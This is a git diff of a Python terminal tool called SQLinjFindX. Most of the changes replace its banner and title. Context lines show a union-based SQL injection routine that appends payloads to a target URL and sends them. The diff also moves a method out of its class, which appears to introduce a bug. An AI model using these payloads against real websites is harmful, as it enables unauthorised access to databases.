@@ -22,27 +22,15 @@ def show_banner(stdscr):
     banner = r"""
 
 
-         
-                            .-=+++-                                                                                                                   
-                          :======+#@#-                         +#.                      .=:-+   +*:                    =     -.          :            
-                  .      *.        =@@%:    =-                 :-                      :#   .-  :-.                    #      =:       .*             
-           *@#%@@@@@%.  %.           *@@+   **.                                        #:                              %       -:     :%:             
-          *@@.    .:.  #+             +@@*  %.                 .                       %.       .                      %:       :#+  :@-              
-          =@@:        -@.              -%@-.+                 #@. :  .--==+=         -+#+.     #@. ..  --==++          %=         -%#@#               
-           .*@*       -@                =@*-:                 -@. -%#.    =@-     .:   -       :@: :@#:    =@=   .:-...@+          %@@#.              
-             :%%.     .@.               +@%+                   #  .@-     .@:     .=   -        #   @-     .@-  +@@@@@@@%        :%*..#@+             
-               -%=     %*              :@%:#.                  :  -%       @.      .  :-        .  -@       %..#@@@@@@@@@.      =#:    :#%.           
-                :@*    -@=       +#  :*@#. #=                     -@       #      .=  -:           :@       # %@@@@@@@@@@=     *%.       -%:          
-                 -@+    +@+     :@@*+@#.   ##                   . -@      .-      +=  =          . :@      .- +@@@@@@@@@@%   .#=           =.         
-        +:::-==+*#%#     =#@***+#@#@@=     #@**####*+=-:          :#              %=  :            .%         :%@@@@@@%#*%= .-                        
-        %@%=-::.            .-::.   .#=          .:::::--=-:.                    .@-                            .:-:.                                 
-        @@.                           =+.                                    =   *@                                                                   
-       :%.                              .                                   =#- +*:                                                                   
-       +.                                                                     --                                                                      
-                                                                                                                                                      
-                                                                                                                                                      
-                                                                                                                                                      
+          __   _   _            __             
+/ _| / \ | |  ()  _ ()/ _|()  _  ||   
+\_ \( o )| |_ |||/ \||| ] |||/ \/o|\V7
+|__/ \_,7|___|L|L_n|||L|  L|L_n|\_|/n\
+                    //                
 
+                                                         
+                                                                                                                                                      
+                                                                                                                                                
     SQLinjFindX by root0emir
     """
     
@@ -68,7 +56,7 @@ class SQLiTool:
     def print_menu(self):
         self.stdscr.clear()
         height, width = self.stdscr.getmaxyx()
-        title = "Advanced SQL Injection Tool - Legion Style"
+        title = "SQLinjfindX"
         self.stdscr.addstr(1, width//2 - len(title)//2, title, curses.color_pair(1))
 
         for idx, option in enumerate(self.menu_options):
@@ -107,17 +95,20 @@ class SQLiTool:
                         self.show_result(self.time_based_sqli())
             self.stdscr.refresh()
 
-    def show_result(self, result):
-        self.stdscr.clear()
-        self.stdscr.addstr(2, 2, "Results:", curses.color_pair(1))
-        y = 4
-        for line in result:
-            self.stdscr.addstr(y, 2, line)
-            y += 1
-            self.stdscr.refresh()
-            time.sleep(0.1)
-        self.stdscr.addstr(y + 1, 2, "Press any key to return to the menu.")
-        self.stdscr.getch()
+def show_result(self, result):
+    self.stdscr.clear()
+    self.stdscr.addstr(2, 2, "Results:", curses.color_pair(1))  
+    y = 4
+    for line in result:
+        self.stdscr.addstr(y, 2, line)
+        y += 1
+        self.stdscr.refresh()  
+        time.sleep(0.1)  
+
+    self.stdscr.addstr(y + 1, 2, "Press any key to return to the menu.")  
+    self.stdscr.refresh()  
+    self.stdscr.getch()  
+
 
     def error_based_sqli(self):
         result = ["[Error-Based SQL Injection Test]"]
@@ -133,7 +124,7 @@ class SQLiTool:
 
     def union_based_sqli(self):
         result = ["[Union-Based SQL Injection Test]"]
-        for i in range(1, 10):  # Adjust number for more columns
+        for i in range(1, 10):  
             payload = f"' UNION SELECT {', '.join(['null']*i)}-- "
             response = requests.get(url + payload, headers=headers)
             if "unknown column" not in response.text.lower():
